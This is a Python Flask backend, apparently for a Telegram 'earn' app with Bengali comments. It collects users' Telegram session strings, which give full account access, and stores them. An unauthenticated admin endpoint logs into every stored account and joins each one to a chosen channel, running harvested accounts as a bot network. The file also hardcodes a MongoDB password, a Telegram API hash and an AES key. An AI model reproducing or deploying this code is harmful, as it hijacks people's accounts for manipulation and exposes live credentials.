import os
import base64
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
from pymongo import MongoClient
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

app = Flask(__name__)
CORS(app)

# --- কনফিগারেশন (MONGO_URI এবং API ঠিক করা হয়েছে) ---
API_ID = 36466824      
API_HASH = '535ddcb85f2c3c74cc0ff532dd2c3406'  
MONGO_URI = os.environ.get("MONGO_URI", "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?appName=Cluster0")
SECRET_KEY = b'AAF_STRONG_APP_SECURE_32_BIT_KEY' 

# ডাটাবেস কানেকশন
try:
    client_db = MongoClient(MONGO_URI)
    db = client_db['AAF_TeleEarn']
    users_col = db['users']
    sessions_col = db['sessions']
    print("✅ Server connected to MongoDB!")
except Exception as e:
    print(f"❌ MongoDB Error: {e}")

# --- সেশন এনক্রিপশন লজিক ---
def encrypt_session(session_str):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(session_str.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return f"{iv}:{ct}"

def decrypt_session(encrypted_str):
    iv_b64, ct_b64 = encrypted_str.split(':')
    iv = base64.b64decode(iv_b64)
    ct = base64.b64decode(ct_b64)
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8')

# --- ১. সেশন সেভ করা ---
@app.route('/api/add_account', methods=['POST'])
def add_account():
    data = request.json
    uid = data.get('telegram_id')
    raw_session = data.get('session_string') 
    phone = data.get('phone')
    if not raw_session or not uid:
        return jsonify({"status": "error", "message": "Invalid data"}), 400
    encrypted = encrypt_session(raw_session)
    sessions_col.update_one({"phone": phone}, {"$set": {"telegram_id": int(uid), "session": encrypted, "status": "Active"}}, upsert=True)
    users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"added_accounts": 1}})
    return jsonify({"status": "success", "message": "Account linked to server!"})

# --- ২. অ্যাডমিন কন্ট্রোল (Force Join লজিক ঠিক করা হয়েছে) ---
async def join_logic(channel):
    all_sessions = sessions_col.find({"status": "Active"})
    count = 0
    for sess in all_sessions:
        try:
            string_session = decrypt_session(sess['session'])
            async with TelegramClient(StringSession(string_session), API_ID, API_HASH) as client:
                await client(functions.channels.JoinChannelRequest(channel=channel))
                count += 1
        except: pass
    return count

@app.route('/api/admin/force_join', methods=['POST'])
def force_join_trigger():
    data = request.json
    channel = data.get('channel', '@aaf_tele_earn')
    # Flask এ async চালানোর সঠিক উপায়
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    joined_count = loop.run_until_complete(join_logic(channel))
    return jsonify({"status": "success", "joined_accounts": joined_count})

# --- ৩. ইউজার ডাটা এবং টাস্ক লিস্ট ---
@app.route('/api/user_data/<telegram_id>', methods=['GET'])
def get_user_data(telegram_id):
    user = users_col.find_one({"telegram_id": int(telegram_id)})
    if user:
        task_list = [
            {"id": 1, "task_name": "Daily Video Ad", "reward": 0.5, "status": "Open"},
            {"id": 2, "task_name": "Join Main Channel", "reward": 1.0, "status": "Pending"}
        ]
        return jsonify({
            "status": "success",
            "name": user.get("name", "User"),
            "main_balance": user.get("main_balance", 0.0),
            "tasks": task_list
        })
    return jsonify({"status": "error", "message": "User not found"}), 404

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)
